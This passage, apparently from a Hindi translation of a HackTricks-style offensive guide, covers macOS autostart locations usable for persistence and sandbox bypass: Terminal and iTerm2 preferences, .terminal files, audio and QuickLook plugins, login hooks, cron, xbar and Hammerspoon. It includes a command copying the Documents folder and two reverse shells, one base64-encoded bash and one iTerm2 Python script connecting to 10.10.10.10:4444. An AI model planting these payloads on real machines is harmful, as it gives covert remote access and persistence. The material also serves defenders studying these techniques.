рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЯрд░реНрдорд┐рдирд▓ рд╕реНрдЯрд╛рд░реНрдЯрдЕрдк рдореЗрдВ рдПрдХ рдХрдорд╛рдВрдб рдЪрд▓рд╛ рд╕рдХрддреА рд╣реИ:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

рдпрд╣ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ **`~/Library/Preferences/com.apple.Terminal.plist`** рдореЗрдВ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рджрд┐рдЦрд╛рдИ рджреЗрддреА рд╣реИ:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
рддреЛ, рдЕрдЧрд░ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдЯрд░реНрдорд┐рдирд▓ рдХреА рдкреНрд░рд╛рдердорд┐рдХрддрд╛рдУрдВ рдХреА рдкреНрд▓рд┐рд╕реНрдЯ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рддреЛ **`open`** рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЯрд░реНрдорд┐рдирд▓ рдЦреЛрд▓реА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдФрд░ рдЙрд╕ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред

рдЖрдк рдЗрд╕реЗ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рд╕реЗ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### рдЯрд░реНрдорд┐рдирд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [тЬЕ](https://emojipedia.org/check-mark-button)

#### рд╕реНрдерд╛рди

* **рдХрд╣реАрдВ рднреА**
* **рдЯреНрд░рд┐рдЧрд░**: рдЯрд░реНрдорд┐рдирд▓ рдЦреЛрд▓реЗрдВ

#### рд╡рд┐рд╡рд░рдг рдФрд░ рд╢реЛрд╖рдг

рдпрджрд┐ рдЖрдк рдПрдХ [**`.terminal`** рд╕реНрдХреНрд░рд┐рдкреНрдЯ](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) рдмрдирд╛рддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ рдЦреЛрд▓рддреЗ рд╣реИрдВ, рддреЛ **рдЯрд░реНрдорд┐рдирд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдЧрдП рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╣реНрд╡рд╛рдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдпрджрд┐ рдЯрд░реНрдорд┐рдирд▓ рдРрдк рдХреЛ рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рдЕрдзрд┐рдХрд╛рд░ (рдЬреИрд╕реЗ TCC) рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХрд╛ рдХрдорд╛рдВрдб рдЙрди рд╡рд┐рд╢реЗрд╖ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
{% hint style="danger" %}
рдпрджрд┐ рдЯрд░реНрдорд┐рдирд▓ рдореЗрдВ **рдкреВрд░реНрдг рдбрд┐рд╕реНрдХ рдПрдХреНрд╕реЗрд╕** рд╣реИ рддреЛ рд╡рд╣ рдЙрд╕ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреЛ рдкреВрд░рд╛ рдХрд░ рд╕рдХреЗрдЧрд╛ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЯрд░реНрдорд┐рдирд▓ рд╡рд┐рдВрдбреЛ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрдорд╛рдВрдб рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛)ред
{% endhint %}

### рдСрдбрд┐рдпреЛ рдкреНрд▓рдЧрдЗрдиреНрд╕

рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
рд▓реЗрдЦ: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

#### рд╕реНрдерд╛рди

* **`/Library/Audio/Plug-Ins/HAL`**
* рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛
* **рдЯреНрд░рд┐рдЧрд░**: coreaudiod рдпрд╛ рдХрдВрдкреНрдпреВрдЯрд░ рдХреЛ рд░реАрд╕реНрдЯрд╛рд░реНрдЯ рдХрд░реЗрдВ
* **`/Library/Audio/Plug-ins/Components`**
* рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛
* **рдЯреНрд░рд┐рдЧрд░**: coreaudiod рдпрд╛ рдХрдВрдкреНрдпреВрдЯрд░ рдХреЛ рд░реАрд╕реНрдЯрд╛рд░реНрдЯ рдХрд░реЗрдВ
* **`~/Library/Audio/Plug-ins/Components`**
* **рдЯреНрд░рд┐рдЧрд░**: coreaudiod рдпрд╛ рдХрдВрдкреНрдпреВрдЯрд░ рдХреЛ рд░реАрд╕реНрдЯрд╛рд░реНрдЯ рдХрд░реЗрдВ
* **`/System/Library/Components`**
* рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛
* **рдЯреНрд░рд┐рдЧрд░**: coreaudiod рдпрд╛ рдХрдВрдкреНрдпреВрдЯрд░ рдХреЛ рд░реАрд╕реНрдЯрд╛рд░реНрдЯ рдХрд░реЗрдВ

#### рд╡рд┐рд╡рд░рдг

рдкрд┐рдЫрд▓реЗ рд▓реЗрдЦреЛрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдХреБрдЫ рдСрдбрд┐рдпреЛ рдкреНрд▓рдЧрдЗрдиреНрд╕ рдХреЛ **рдХрдВрдкрд╛рдЗрд▓** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### рдХреНрд╡рд┐рдХрд▓реБрдХ рдкреНрд▓рдЧрдЗрдиреНрд╕

рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [тЬЕ](https://emojipedia.org/check-mark-button)

#### рд╕реНрдерд╛рди

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### рд╡рд┐рд╡рд░рдг рдФрд░ рд╢реЛрд╖рдг

рдХреНрд╡рд┐рдХрд▓реБрдХ рдкреНрд▓рдЧрдЗрдиреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдЖрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдкреВрд░реНрд╡рд╛рд╡рд▓реЛрдХрди рдХреЛ **рдЯреНрд░рд┐рдЧрд░ рдХрд░рддреЗ рд╣реИрдВ** (рдлрд╝рд╛рдЗрд▓ рдХреЛ рдлрд╝рд╛рдЗрдВрдбрд░ рдореЗрдВ рдЪрдпрдирд┐рдд рдХрд░рдХреЗ рд╕реНрдкреЗрд╕ рдмрд╛рд░ рджрдмрд╛рдПрдВ) рдФрд░ рдПрдХ **рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдХрд╛рд░ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдкреНрд▓рдЧрдЗрди** рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрддрд╛ рд╣реИред

рдЖрдк рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ рдХреНрд╡рд┐рдХрд▓реБрдХ рдкреНрд▓рдЧрдЗрди рдХрдВрдкрд╛рдЗрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрд╕реЗ рдкрд┐рдЫрд▓реЗ рд╕реНрдерд╛рдиреЛрдВ рдореЗрдВ рд░рдЦреЗрдВ рдФрд░ рдлрд┐рд░ рд╕рдорд░реНрдерд┐рдд рдлрд╝рд╛рдЗрд▓ рдкрд░ рдЬрд╛рдПрдВ рдФрд░ рдЙрд╕реЗ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдкреЗрд╕ рдмрд╛рд░ рджрдмрд╛рдПрдВред

### ~~рд▓реЙрдЧрд┐рди/рд▓реЙрдЧрдЖрдЙрдЯ рд╣реБрдХ~~

{% hint style="danger" %}
рдореЗрд░реЗ рд╕рд╛рде рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд┐рдпрд╛, рди рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧрд┐рди рд╣реБрдХ рдФрд░ рди рд╣реА рд░реВрдЯ рд▓реЙрдЧрдЖрдЙрдЯ рд╣реБрдХ рдХреЗ рд╕рд╛рдеред
{% endhint %}

**рд▓реЗрдЦ**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [тЬЕ](https://emojipedia.org/check-mark-button)

#### рд╕реНрдерд╛рди

* рдЖрдкрдХреЛ рдХреБрдЫ рдРрд╕рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдЬреИрд╕реЗ `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* `~/Library/Preferences/com.apple.loginwindow.plist` рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИрдВ

рд╡реЗ рдкреБрд░рд╛рдиреЗ рд╣реЛ рдЧрдП рд╣реИрдВ рд▓реЗрдХрд┐рди рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧ рдЗрди рдХрд░рддрд╛ рд╣реИ рддреЛ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИред
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
рдЗрд╕реЗ рд╣рдЯрд╛рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
**`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** рдореЗрдВ рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддрд╛ рд╣реИред

## рд╢рд░реНрддрд╛рдзреАрди рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдмрд╛рдИрдкрд╛рд╕

{% hint style="success" %}
рдпрд╣рд╛рдВ рдЖрдкрдХреЛ **рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдмрд╛рдИрдкрд╛рд╕** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╕реНрдЯрд╛рд░реНрдЯ рд╕реНрдерд╛рди рдорд┐рд▓реЗрдВрдЧреЗ рдЬреЛ рдЖрдкрдХреЛ рдХреЗрд╡рд▓ рдХрд┐рд╕реА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдХрд░ рдХреБрдЫ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдФрд░ рд╡рд┐рд╢реЗрд╖ **рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╕реНрдерд╛рдкрд┐рдд, "рдЕрд╕рд╛рдорд╛рдиреНрдп" рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреНрд░рд┐рдпрд╛рдПрдБ рдпрд╛ рдкрд░реНрдпрд╛рд╡рд░рдг рдХреА рдЬрд░реВрд░рдд рдЬреИрд╕реА **рдЖрдо рдирд╣реАрдВ рд╣реЛрдиреЗ** рдХреА рдЙрдореНрдореАрдж рд░рдЦрддреА рд╣реИред
{% endhint %}

### рдХреНрд░реЙрди

**рд▓реЗрдЦ**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдмрд╛рдИрдкрд╛рд╕ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [тЬЕ](https://emojipedia.org/check-mark-button)
* рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдкрдХреЛ `crontab` рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП
* рдпрд╛ рдлрд┐рд░ рд░реВрдЯ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП

#### рд╕реНрдерд╛рди

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* рд╕реАрдзреА рд▓реЗрдЦрди рдкрд╣реБрдБрдЪ рдХреЗ рд▓рд┐рдП рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред `crontab <file>` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ
* **рдЯреНрд░рд┐рдЧрд░**: рдХреНрд░реЙрди рдЬреЙрдм рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░реЗрдЧрд╛

#### рд╡рд┐рд╡рд░рдг рдФрд░ рд╢реЛрд╖рдг
```bash
crontab -l
```
рдЖрдк рдпреВрдЬрд░реНрд╕ рдХреЗ рд╕рднреА рдХреНрд░реЙрди рдЬреЙрдмреНрд╕ рдХреЛ рднреА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ **`/usr/lib/cron/tabs/`** рдФрд░ **`/var/at/tabs/`** рдореЗрдВ (рд░реВрдЯ рдЕрдзрд┐рдХрд╛рд░ рдЪрд╛рд╣рд┐рдПред)

MacOS рдореЗрдВ рдХрдИ рдлрд╝реЛрд▓реНрдбрд░ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ **рдирд┐рд╢реНрдЪрд┐рдд рдЕрдВрддрд░рд╛рд▓** рдХреЗ рд╕рд╛рде рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╣реИрдВ:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
рд╡рд╣рд╛рдВ рдЖрдк рдирд┐рдпрдорд┐рдд **cron** **рдЬреЙрдмреНрд╕**, **at** **рдЬреЙрдмреНрд╕** (рдмрд╣реБрдд рдХрдо рдЙрдкрдпреЛрдЧ рд╣реЛрддреЗ рд╣реИрдВ) рдФрд░ **рдкреАрд░рд┐рдпрдбрд┐рдХ** **рдЬреЙрдмреНрд╕** (рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рд╛рдлрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ) рдорд┐рд▓реЗрдВрдЧреЗред рджреИрдирд┐рдХ рдкреАрд░рд┐рдпрдбрд┐рдХ рдЬреЙрдмреНрд╕ рдХреЛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЗрд╕ рддрд░рд╣ рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: `periodic daily`ред

**рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд░реЙрдирдЬреЙрдм рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреЛ рдкреНрд░реЛрдЧреНрд░рд╛рдореЗрдЯрд┐рдХ рд░реВрдк рд╕реЗ рдЬреЛрдбрд╝рдиреЗ** рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [тЬЕ](https://emojipedia.org/check-mark-button)

#### рд╕реНрдерд╛рди

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **рдЯреНрд░рд┐рдЧрд░**: iTerm рдЦреЛрд▓реЗрдВ
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **рдЯреНрд░рд┐рдЧрд░**: iTerm рдЦреЛрд▓реЗрдВ
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **рдЯреНрд░рд┐рдЧрд░**: iTerm рдЦреЛрд▓реЗрдВ

#### рд╡рд┐рд╡рд░рдг рдФрд░ рдЙрддреНрдкреАрдбрд╝рди

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдВрдЧреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
рдпрд╛:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
рд╕реНрдХреНрд░рд┐рдкреНрдЯ **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** рднреА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`** рдореЗрдВ рд╕реНрдерд┐рдд iTerm2 рдкреНрд░рд╛рдердорд┐рдХрддрд╛рдПрдВ рдЬрдм iTerm2 рдЯрд░реНрдорд┐рдирд▓ рдЦреЛрд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **рдПрдХ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рд╕рдВрдХреЗрдд рдХрд░ рд╕рдХрддреА рд╣реИрдВ**ред

рдЗрд╕ рд╕реЗрдЯрд┐рдВрдЧ рдХреЛ iTerm2 рд╕реЗрдЯрд┐рдВрдЧ рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

рдФрд░ рдпрд╣ рдХрдорд╛рдВрдб рдкреНрд░рд╛рдердорд┐рдХрддрд╛рдУрдВ рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрддрд╛ рд╣реИ:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЛ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
рдмрд╣реБрдд рд╕рдВрднрд╛рд╡рд┐рдд рд╣реИ рдХрд┐ iTerm2 рдкреНрд░рд╛рдердорд┐рдХрддрд╛рдПрдВ рдЕрдирд┐рдпрдорд┐рдд рдЖрджреЗрд╢ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЕрдиреНрдп рддрд░реАрдХреЗ** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

### xbar

рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [тЬЕ](https://emojipedia.org/check-mark-button)
* рд▓реЗрдХрд┐рди xbar рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП

#### рд╕реНрдерд╛рди

* **`~/Library/Application\ Support/xbar/plugins/`**
* **рдЯреНрд░рд┐рдЧрд░**: xbar рдХреЛ рдПрдХреНрд╕реАрдХреНрдпреВрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ

### Hammerspoon

**рд▓реЗрдЦ**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [тЬЕ](https://emojipedia.org/check-mark-button)

* рд▓реЗрдХрд┐рди Hammerspoon рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП

#### рд╕реНрдерд╛рди

* **`~/.hammerspoon/init.lua`**
* **рдЯреНрд░рд┐рдЧрд░**: hammerspoon рдХреЛ рдПрдХреНрд╕реАрдХреНрдпреВрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ

#### рд╡рд┐рд╡рд░рдг

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) рдПрдХ рд╕реНрд╡рдЪрд╛рд▓рди рдЙрдкрдХрд░рдг рд╣реИ, рдЬреЛ **LUA рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рднрд╛рд╖рд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ macOS рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рд╣рдо рдкреВрд░реЗ AppleScript рдХреЛрдб рдХреЛ рднреА рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдРрдк рдПрдХ рд╣реА рдлрд╝рд╛рдЗрд▓, `~/.hammerspoon/init.lua`, рдХреА рддрд▓рд╛рд╢ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдЬрдм рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ, рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
```bash
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("id > /tmp/hs.txt")
EOF
```
### SSHRC

